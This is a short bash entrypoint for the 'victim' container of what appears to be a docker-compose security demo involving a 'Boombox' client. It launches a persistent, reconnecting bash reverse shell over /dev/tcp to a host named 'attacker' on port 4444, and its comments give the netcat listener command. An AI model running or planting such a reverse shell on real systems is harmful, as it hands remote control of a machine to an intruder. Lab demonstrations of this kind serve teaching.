#!/usr/bin/env bash
# The compromised machine: a reverse shell to the attacker that keeps reconnecting,
# plus the Boombox client. The reverse shell only connects once someone runs the listener
# on the attacker (docker compose exec attacker nc -lvn 4444); until then it retries.
touch /tmp/hacked-screen
bash -c 'while true; do bash -i >& /dev/tcp/attacker/4444 0>&1; sleep 5; done' 2>/dev/null &
echo "[victim] reverse shell to attacker:4444 started"
exec python3 -u /demo/client.py
